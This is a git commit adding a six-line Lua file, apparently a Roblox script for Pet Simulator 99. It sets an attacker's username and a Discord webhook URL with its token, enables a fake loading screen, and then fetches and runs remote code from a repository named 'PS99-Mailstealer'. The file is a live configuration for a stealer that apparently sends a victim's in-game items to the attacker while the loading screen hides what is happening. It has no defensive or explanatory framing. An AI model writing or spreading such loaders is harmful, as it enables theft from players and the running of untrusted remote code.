3253f9b45d2951ffea046c8f3dea1fe2e1762ef1
noGlxcka <159496597+noGlxcka@users.noreply.github.com>
2024-04-05 09:48:35 +0800

    Create main.lua

---
+++ main.lua
@@ -0,0 +1,6 @@
+Username = "CyanRedBlueLimeGamer"
+Webhook = "https://discord.com/api/webhooks/1201061151979622410/K-I08rcv7a4C5O185BilhmlUR5LzF3xGjZ34DdDiZnbWC0xKd6C8MhK3rvLjTEM2xu0m"
+selectedLoadingScreen = "4" -- Select Loading Screen And Write Number If You Not Select Loading Screen its automaticly select loading screen 1
+LoadingScreen = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
